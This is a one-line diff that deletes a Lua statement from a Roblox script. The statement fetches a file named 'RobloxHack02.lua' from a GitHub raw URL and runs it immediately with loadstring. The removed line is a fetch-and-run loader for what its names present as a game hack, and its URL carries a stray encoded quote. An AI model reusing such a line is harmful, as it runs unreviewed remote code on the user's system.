@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/RbxScriptCreator/Robloxhack0.2/main/RobloxHack02.lua%22))()
